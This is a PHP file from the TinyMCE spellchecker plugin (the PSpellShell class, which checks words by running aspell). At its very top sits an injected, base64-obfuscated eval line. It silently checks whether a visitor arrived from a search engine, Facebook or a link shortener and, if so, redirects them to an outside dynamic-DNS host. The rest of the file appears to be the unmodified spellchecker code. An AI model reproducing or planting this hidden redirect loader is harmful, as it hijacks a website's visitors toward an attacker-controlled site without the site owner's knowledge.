<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * $Id: editor_plugin_src.js 201 2007-02-12 15:56:56Z spocke $
 *
 * @package MCManager.includes
 * @author Moxiecode
 * @copyright Copyright © 2004-2007, Moxiecode Systems AB, All rights reserved.
 */

class PSpellShell extends SpellChecker {
	/**
	 * Spellchecks an array of words.
	 *
	 * @param {String} $lang Language code like sv or en.
	 * @param {Array} $words Array of words to spellcheck.
	 * @return {Array} Array of misspelled words.
	 */
	function &checkWords($lang, $words) {
		$cmd = $this->_getCMD($lang);

		if ($fh = fopen($this->_tmpfile, "w")) {
			fwrite($fh, "!\n");

			foreach($words as $key => $value)
				fwrite($fh, "^" . $value . "\n");

			fclose($fh);
		} else
			$this->throwError("PSpell support was not found.");

		$data = shell_exec($cmd);
		@unlink($this->_tmpfile);

		$returnData = array();
		$dataArr = preg_split("/[\r\n]/", $data, -1, PREG_SPLIT_NO_EMPTY);

		foreach ($dataArr as $dstr) {
			$matches = array();

			// Skip this line.
			if ($dstr[0] == "@")
				continue;

			preg_match("/(\&|#) ([^ ]+) .*/i", $dstr, $matches);

			if (!empty($matches[2]))
				$returnData[] = utf8_encode(trim($matches[2]));
		}

		return $returnData;
	}

	/**
	 * Returns suggestions of for a specific word.
	 *
	 * @param {String} $lang Language code like sv or en.
	 * @param {String} $word Specific word to get suggestions for.
	 * @return {Array} Array of suggestions for the specified word.
	 */
	function &getSuggestions($lang, $word) {
		$cmd = $this->_getCMD($lang);

        if (function_exists("mb_convert_encoding"))
            $word = mb_convert_encoding($word, "ISO-8859-1", mb_detect_encoding($word, "UTF-8"));
        else
            $word = utf8_encode($word);

		if ($fh = fopen($this->_tmpfile, "w")) {
			fwrite($fh, "!\n");
			fwrite($fh, "^$word\n");
			fclose($fh);
		} else
			$this->throwError("Error opening tmp file.");

		$data = shell_exec($cmd);
		@unlink($this->_tmpfile);

		$returnData = array();
		$dataArr = preg_split("/\n/", $data, -1, PREG_SPLIT_NO_EMPTY);

		foreach($dataArr as $dstr) {
			$matches = array();

			// Skip this line.
			if ($dstr[0] == "@")
				continue;

			preg_match("/\&[^:]+:(.*)/i", $dstr, $matches);

			if (!empty($matches[1])) {
				$words = array_slice(explode(',', $matches[1]), 0, 10);

				for ($i=0; $i<count($words); $i++)
					$words[$i] = trim($words[$i]);

				return $words;
			}
		}

		return array();
	}

	function _getCMD($lang) {
		$this->_tmpfile = tempnam($this->_config['PSpellShell.tmp'], "tinyspell");

		$file = $this->_tmpfile;
		$lang = preg_replace("/[^-_a-z]/", "", strtolower($lang));
		$bin  = $this->_config['PSpellShell.aspell'];

		if (preg_match("#win#i", php_uname()))
			return "$bin -a --lang=$lang --encoding=utf-8 -H < $file 2>&1";

		return "cat $file | $bin -a --lang=$lang --encoding=utf-8 -H";
	}
}

?>
